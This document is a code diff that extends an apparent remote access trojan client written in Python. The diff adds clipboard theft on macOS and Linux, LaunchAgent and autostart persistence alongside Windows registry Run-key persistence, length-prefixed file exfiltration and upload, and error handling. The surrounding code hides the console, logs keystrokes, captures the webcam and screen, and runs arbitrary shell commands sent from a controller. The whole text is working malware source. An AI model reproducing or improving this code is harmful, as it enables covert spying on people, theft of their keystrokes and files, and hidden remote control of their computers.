@@ -11,16 +11,18 @@ import threading
 import time
 import random
 import string
+import struct
 from datetime import datetime
 from time import sleep
 
 IS_WINDOWS = platform.system() == "Windows"
+IS_MAC = platform.system() == "Darwin"
+IS_LINUX = platform.system() == "Linux"
 
 if IS_WINDOWS:
     try:
         import winreg
         import ctypes
-        from ctypes import wintypes
     except:
         pass
 
@@ -37,8 +39,8 @@ try:
 except:
     PYNPUT_AVAILABLE = False
 
-import protocol
 import crypto
+import protocol
 
 IP = "127.0.0.1"
 PORT = 443
@@ -51,16 +53,18 @@ class Disguise:
     @staticmethod
     def set_console_title(title=""):
         if IS_WINDOWS:
-            ctypes.windll.kernel32.SetConsoleTitleW(title)
+            try:
+                ctypes.windll.kernel32.SetConsoleTitleW(title)
+            except:
+                pass
     
     @staticmethod
     def hide_console():
         if IS_WINDOWS:
-            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    
-    @staticmethod
-    def random_filename():
-        return ''.join(random.choices(string.ascii_lowercase, k=8)) + '.exe'
+            try:
+                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+            except:
+                pass
 
 class Keylogger:
     def __init__(self):
@@ -160,10 +164,16 @@ class Clipboard:
                 data = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
                 return f"[CLIPBOARD]\n{data}\n"
-            else:
-                return "[-] Clipboard only on Windows"
-        except:
-            return "[-] Clipboard access failed"
+            elif IS_MAC:
+                result = subprocess.run(['pbpaste'], capture_output=True, text=True)
+                return f"[CLIPBOARD]\n{result.stdout}\n"
+            elif IS_LINUX:
+                result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], 
+                                      capture_output=True, text=True)
+                return f"[CLIPBOARD]\n{result.stdout}\n"
+            return "[-] Clipboard unavailable"
+        except Exception as e:
+            return f"[-] Clipboard error: {e}"
 
 class Webcam:
     @staticmethod
@@ -186,7 +196,7 @@ class FileManager:
         try:
             with open(filepath, 'rb') as f:
                 return f.read()
-        except:
+        except Exception as e:
             return None
     
     @staticmethod
@@ -203,34 +213,68 @@ class Persistence:
     def install():
         try:
             current = os.path.abspath(sys.argv[0])
+            
             if IS_WINDOWS:
-                appdata = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows')
-                os.makedirs(appdata, exist_ok=True)
-                dest = os.path.join(appdata, f"{PROGRAM_NAME}.py")
-                if current != dest:
-                    shutil.copy2(current, dest)
-                
-                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
-                                   0, winreg.KEY_SET_VALUE)
-                winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ,
-                                f'"{sys.executable}" "{dest}"')
-                winreg.CloseKey(key)
-            else:
-                target = os.path.expanduser("~/.local/share")
-                os.makedirs(target, exist_ok=True)
-                dest = os.path.join(target, f"{PROGRAM_NAME}.py")
-                if current != dest:
-                    shutil.copy2(current, dest)
-                
-                autostart = os.path.expanduser("~/.config/autostart")
-                os.makedirs(autostart, exist_ok=True)
-                desktop = os.path.join(autostart, f"{PROGRAM_NAME}.desktop")
-                entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{dest}\"\nHidden=false\nName={PROGRAM_NAME}\n"
-                with open(desktop, "w") as f:
-                    f.write(entry)
-        except:
-            pass
+                try:
+                    appdata = os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows')
+                    os.makedirs(appdata, exist_ok=True)
+                    dest = os.path.join(appdata, f"{PROGRAM_NAME}.py")
+                    if current != dest:
+                        shutil.copy2(current, dest)
+                    
+                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                                       r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                       0, winreg.KEY_SET_VALUE)
+                    winreg.SetValueEx(key, PROGRAM_NAME, 0, winreg.REG_SZ,
+                                    f'"{sys.executable}" "{dest}"')
+                    winreg.CloseKey(key)
+                except Exception as e:
+                    print(f"[-] Windows persistence failed: {e}")
+                    
+            elif IS_MAC:
+                try:
+                    launch_agents = os.path.expanduser("~/Library/LaunchAgents")
+                    os.makedirs(launch_agents, exist_ok=True)
+                    plist_path = os.path.join(launch_agents, f"com.{PROGRAM_NAME}.plist")
+                    plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.{PROGRAM_NAME}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{sys.executable}</string>
+        <string>{current}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>'''
+                    with open(plist_path, 'w') as f:
+                        f.write(plist_content)
+                except Exception as e:
+                    print(f"[-] macOS persistence failed: {e}")
+                    
+            else:  # Linux
+                try:
+                    target = os.path.expanduser("~/.local/share")
+                    os.makedirs(target, exist_ok=True)
+                    dest = os.path.join(target, f"{PROGRAM_NAME}.py")
+                    if current != dest:
+                        shutil.copy2(current, dest)
+                    
+                    autostart = os.path.expanduser("~/.config/autostart")
+                    os.makedirs(autostart, exist_ok=True)
+                    desktop = os.path.join(autostart, f"{PROGRAM_NAME}.desktop")
+                    entry = f"[Desktop Entry]\nType=Application\nExec={sys.executable} \"{dest}\"\nHidden=false\nName={PROGRAM_NAME}\n"
+                    with open(desktop, "w") as f:
+                        f.write(entry)
+                except Exception as e:
+                    print(f"[-] Linux persistence failed: {e}")
+                    
+        except Exception as e:
+            print(f"[-] Persistence error: {e}")
 
 class Client:
     def __init__(self):
@@ -248,12 +292,12 @@ class Client:
             
             key = os.urandom(32)
             self.crypto.set_key(key)
-            sock.send(base64.b64encode(key))
+            crypto.SecureChannel.send_key(sock, key)
             
             sock.settimeout(None)
             self.protocol.send(sock, "[+] Client connected")
             return sock
-        except:
+        except Exception as e:
             return None
     
     def screenshot(self):
@@ -264,7 +308,7 @@ class Client:
             buffer = io.BytesIO()
             img.save(buffer, format='PNG')
             return buffer.getvalue()
-        except:
+        except Exception as e:
             return None
     
     def execute_shell(self, cmd):
@@ -277,8 +321,8 @@ class Client:
         except subprocess.TimeoutExpired:
             proc.kill()
             return b"[-] Timeout"
-        except:
-            return b"[-] Execution failed"
+        except Exception as e:
+            return f"[-] Execution failed: {e}".encode('utf-8')
     
     def handle_command(self, sock, cmd):
         if cmd == '/exit':
@@ -311,18 +355,23 @@ class Client:
             filepath = cmd[10:].strip()
             data = FileManager.download(filepath)
             if data:
-                self.protocol.send(sock, b'[FILE]' + filepath.encode() + b'|' + data)
+                filepath_bytes = os.path.basename(filepath).encode('utf-8')
+                header = struct.pack(">I", len(filepath_bytes))
+                self.protocol.send(sock, b'[FILE]' + header + filepath_bytes + data)
             else:
                 self.protocol.send(sock, "[-] Download failed")
-        elif cmd.startswith('[UPLOAD]'):
+        elif cmd.startswith('[FILE]'):
             try:
-                parts = cmd[8:].split('|', 1)
-                if len(parts) == 2:
-                    filename, content = parts[0], parts[1].encode('latin-1')
-                    FileManager.upload(filename, content)
-                    self.protocol.send(sock, f"[+] Uploaded: {filename}")
-            except:
-                self.protocol.send(sock, "[-] Upload failed")
+                data = cmd[6:]
+                filepath_len = struct.unpack(">I", data[:4])[0]
+                filepath = data[4:4+filepath_len].decode('utf-8')
+                content = data[4+filepath_len:]
+                if FileManager.upload(filepath, content):
+                    self.protocol.send(sock, f"[+] Uploaded: {filepath}")
+                else:
+                    self.protocol.send(sock, "[-] Upload failed")
+            except Exception as e:
+                self.protocol.send(sock, f"[-] Upload error: {e}")
         else:
             result = self.execute_shell(cmd)
             self.protocol.send(sock, result)
@@ -331,13 +380,13 @@ class Client:
     def listen(self, sock):
         while self.running:
             try:
-                payload = self.protocol.receive(sock)
+                msg_type, payload = self.protocol.receive(sock)
                 if payload is None:
                     break
                 cmd = payload.decode('utf-8', errors='replace').strip()
                 if not self.handle_command(sock, cmd):
                     break
-            except:
+            except Exception as e:
                 break
     
     def run(self):
